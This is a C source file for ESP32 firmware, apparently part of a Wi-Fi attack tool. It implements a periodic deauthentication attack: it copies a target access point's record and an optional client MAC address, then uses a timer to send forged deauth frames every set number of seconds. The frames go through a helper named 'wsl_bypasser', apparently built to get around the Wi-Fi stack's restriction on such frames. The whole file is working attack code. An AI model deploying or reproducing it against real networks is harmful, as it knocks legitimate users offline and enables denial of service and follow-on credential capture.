/**
 * @file attack_deauth.c
 * @brief Implements the periodic deauthentication attack.
 */
#include "attack_deauth.h"

#include <stdbool.h>
#include <string.h>

#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"

#include "wsl_bypasser.h"

static const char *TAG = "attack_deauth";

static esp_timer_handle_t deauth_timer_handle;
static wifi_ap_record_t target_ap_record;
static uint8_t target_sta_mac[6];
static bool has_target_sta = false;
static bool running = false;

static void timer_send_deauth_frame(void *arg) {
    wsl_bypasser_send_deauth_frame(&target_ap_record, has_target_sta ? target_sta_mac : NULL);
}

void attack_deauth_start(const wifi_ap_record_t *ap_record, const uint8_t *sta_mac, unsigned period_sec) {
    if (running) {
        ESP_LOGW(TAG, "Deauth attack already running, stop it first");
        return;
    }
    ESP_LOGI(TAG, "Starting deauth attack...");

    memcpy(&target_ap_record, ap_record, sizeof(target_ap_record));
    has_target_sta = (sta_mac != NULL);
    if (has_target_sta) {
        memcpy(target_sta_mac, sta_mac, sizeof(target_sta_mac));
    }

    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &timer_send_deauth_frame,
        .name = "deauth_timer"
    };
    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
    // Send the first frame immediately, then repeat every period_sec.
    timer_send_deauth_frame(NULL);
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, (uint64_t) period_sec * 1000000));
    running = true;
}

void attack_deauth_stop() {
    if (!running) {
        return;
    }
    ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
    ESP_ERROR_CHECK(esp_timer_delete(deauth_timer_handle));
    running = false;
    ESP_LOGI(TAG, "Deauth attack stopped");
}
